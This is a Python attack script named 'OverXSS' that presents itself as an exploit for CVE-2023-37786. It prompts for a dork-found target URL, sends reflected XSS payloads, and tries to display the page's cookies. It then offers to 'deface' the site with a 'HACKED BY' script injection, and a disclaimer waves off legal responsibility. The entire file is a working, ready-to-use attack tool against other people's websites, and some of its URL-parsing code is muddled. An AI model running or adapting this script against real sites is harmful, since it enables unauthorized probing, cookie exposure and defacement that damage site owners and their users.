import requests as rq
import os
import time
import socket

os.system('cls' if os.name == 'nt' else 'clear')
def banner():
        print('''
       ▌ ▐·▄▄▄ .▄▄▄  ▐▄• ▄ .▄▄ · .▄▄ ·
▪     ▪█·█▌▀▄.▀·▀▄ █· █▌█▌▪▐█ ▀. ▐█ ▀.
 ▄█▀▄ ▐█▐█•▐▀▀▪▄▐▀▀▄  ·██· ▄▀▀▀█▄▄▀▀▀█▄
▐█▌.▐▌ ███ ▐█▄▄▌▐█•█▌▪▐█·█▌▐█▄▪▐█▐█▄▪▐█
 ▀█▄▀▪. ▀   ▀▀▀ .▀  ▀•▀▀ ▀▀ ▀▀▀▀  ▀▀▀▀
                        © PhamChien

 OverXSS Is the tool Exploit CVE-2023-37786
          and hacked server XSS
''')
banner()
print("step 1 : you must enter the domain without http://")
HOST = input("HOST (ex : test123.com) => ")
print("")
blocked = input("We would like to declare , if you have any problem with the law , we will not be responsible for all problems , do you agree ? [ y/n ] : ")
if blocked == "y":
        print("")
        print("step 2 : you have to enter the url with dork")
        URL = input("URL TARGET (ex : http://test123.com/search.php?id=) => ")
        print("")
        print("TARGET --> {}".format(URL))
        payload_data = ["<script>document.body.innerHTML=('ph4mch13n');</script>"]
        for payload in payload_data:
                output = rq.get(URL + "/" + payload)
                print("Checking Response...")
                if output.status_code == 200:
                        print("total status : {}".format(output.status_code))
                        time.sleep(1)
                        print("checking vulnerable XSS starting...")

                        if "ph4mch13n" in output.text:
                                print("total checked : Vulnerable !")
                                print("total version : {}".format(output.raw.version))
                                remove_http = URL.replace("http://", "").replace("https://", "")
                                result = URL.split("://")
                                remove_now = result[-1]
                                remove_path = remove_now.replace("/", "")
                                results = remove_now.split("/")
                                remove_nows = "/".join(results[-1])
                                SERVER = socket.gethostbyname(HOST)
                                print("total server : {}".format(SERVER))
                                print("total url : {}".format(remove_now))
                                print("total path : {}".format(remove_nows))
                                print("total reason : {}".format(output.reason))
                                heads = rq.head(URL)
                                head_code = heads.headers.get('head')
                                print("total head : {}".format(head_code))
                                print("payload : {}".format(payload))

                                def get_cookie():
                                        payloadment = "<script>document.body.innerHTML=(document.cookie);</script>"
                                        response = rq.get(URL + payloadment)
                                        cookie = response.text
                                        print("starting get cookie...")
                                        time.sleep(3)
                                        print("status : {}".format(response))
                                        if "__utmz=" in cookie:
                                                print("total cookie : {}".format(cookie))
                                        elif "__ga=" in cookie:
                                                print("total cookie : {}".format(cookie))
                                        else:
                                                print("total cookie : None Cookie")
                                get_cookie()
                                time.sleep(3)
                                filters = vars(output)
                                for datas, value in filters.items():
                                        if datas != "_content":
                                                print("total filter properties : ", datas, ":", value)
                                                time.sleep(1)

                                defaced = input("Do you want to deface this site with the XSS script error code? [ y/n ] : ")
                                if defaced == "y":
                                        set_name = input("Enter Your Name Attacker => ")
                                        payloads = f"<script>document.body.innerHTML=('HACKED BY {set_name}')</script>&Send=1"
                                        output = rq.get(URL + payloads)
                                        print("total status : {}".format(output))
                                        time.sleep(1)
                                        print("start get payload...")
                                        time.sleep(1)
                                        print("Start Deface...")
                                        time.sleep(0.2)
                                        print("processing...")
                                        time.sleep(3)
                                        if "HACKED BY" in output.text:
                                                print("Deface Success")
                                                print("URL : {}{}".format(URL, payloads))
                                                exit()
                                        else:
                                                print("Deface Failed , I So Sorry, please agian...")
                                                exit()

                                elif defaced == "n":
                                        print("Thank You For Using Tool ;)")
                                        exit()
                        else:
                                print("total checked : Not Vuln")
                else:
                        print("The HOST Target Not Responding !!")
                        exit()
else:
        print("Ok..")
        exit()
